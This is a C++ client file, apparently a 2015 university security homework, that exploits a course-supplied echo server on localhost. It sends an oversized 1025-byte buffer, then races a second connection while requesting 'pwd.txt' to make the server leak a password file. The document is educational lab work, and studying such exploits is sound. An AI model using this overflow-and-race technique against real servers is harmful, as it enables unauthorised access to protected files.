// HW 6 - Echo server exploit
// THIS is the file that you need to modify this file for this assignment
// Jeremy Martinez, Kyle Avery
// 10-9-2015
// Cpts 422

#include <iostream>
#include "TCPComm.h"

using namespace std;
using namespace CS422;

int server_response = 0;

void GotData(TCPComm* comm, unsigned char* data, int dataLength)
{
	char* buf = new char[dataLength + 1];
	memcpy(buf, data, dataLength);
	buf[dataLength] = 0;

	cout << endl;
	cout << "Output from server: " << buf << endl << endl;
	server_response++;
}

/// Initializes a new TCPComm
TCPComm* initialize_comm_line() { TCPComm* output = TCPComm::Create("localhost", 42200); output->OnDataReceived = GotData; return output; }

// Make sure the TCPComm is connected to the server
int check_comm_line(TCPComm* input)
{
	if (!input)
	{
		cout << "Could not connect to server" << endl;
		cout << "Make sure the server is running first then re-run this client" << endl;
		return -1;
	}
	return 0;
}

// Send some input to the server
void send_to_server(TCPComm* comm, char* input, int input_size)
{
	char *temp = new char[input_size + 2];
	memcpy(&temp[2], input, input_size);
	((unsigned short*)temp)[0] = (unsigned short)input_size;
	comm->Send(temp, input_size + 2);
	delete[] temp;
}

// infiltrate the server
void sneak(TCPComm* comm) { char* temp = "422 echo server handshake"; comm->Send(temp, strlen(temp)); }

// Complete the contract while the server is distracted
void assassinate(TCPComm* comm, char* input, int input_size) { comm->Send(input, (input_size + 1)); }

int main(int argc, const char* argv[])
{
	TCPComm* assassin = initialize_comm_line();

	if (check_comm_line(assassin) == -1)
		return -1;

	sneak(assassin);
	while (server_response != 1);

	char buffer_overflow[1025];
	memset(buffer_overflow, '?', 1025);
	send_to_server(assassin, buffer_overflow, 1025);
	while (server_response != 2);

	TCPComm* distraction = initialize_comm_line();
	char* knife = "pwd.txt";
	assassinate(assassin, knife, strlen(knife));
	sneak(distraction);
	while (server_response != 3);

	cout << "Done" << endl;
	string a = "";
	cin >> a;
}